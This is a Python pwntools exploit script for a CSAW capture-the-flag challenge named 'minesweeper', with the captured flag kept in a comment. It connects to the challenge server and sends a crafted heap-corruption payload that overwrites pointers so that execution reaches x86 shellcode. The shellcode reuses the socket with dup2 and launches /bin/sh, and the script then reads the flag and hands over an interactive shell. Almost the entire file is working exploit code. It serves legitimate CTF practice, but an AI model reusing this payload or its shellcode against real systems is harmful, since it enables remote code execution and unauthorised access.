#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# flag{h3aps4r3fun351eabf3}

context.arch = 'i386'

e = ELF('./minesweeper')
host , port = 'pwn.chal.csaw.io' , 7478

y = remote( host , port )

def init( a , b , data ):
    y.sendlineafter( 'Quit)' , 'I' )
    y.sendlineafter( 'B X Y' , 'B {} {}'.format( str( a ) , str( b ) ) )
    y.sendlineafter( 'r X' , data )


dup2="""
    mov ebx, 4
    push 0
    pop ecx
    /* call dup2() */
    push SYS_dup2 /* 0x3f */
    pop eax
    int 0x80

    mov ebx, 4
    push 1
    pop ecx
    /* call dup2() */
    push SYS_dup2 /* 0x3f */
    pop eax
    int 0x80
"""

_asm = '''
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f

    /* call execve('esp', 0, 0) */
    push (SYS_execve) /* 0xb */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    cdq /* edx=0 */
    int 0x80
'''

sc = asm( dup2 ) + asm( _asm )

p = 'XXXX' + p32( 0x804bd78 - 0x8 ) + p32( 0x804bdbc ) + '\x90' * 400 + asm( 'mov esp, 0x804bdf0' ) + sc
p += 'a' * ( 500 - len( p ) )

init( 1 , 500 , p )

y.sendline('yuawn')

sleep(1)

y.sendline( 'cat ./flag' )

y.interactive()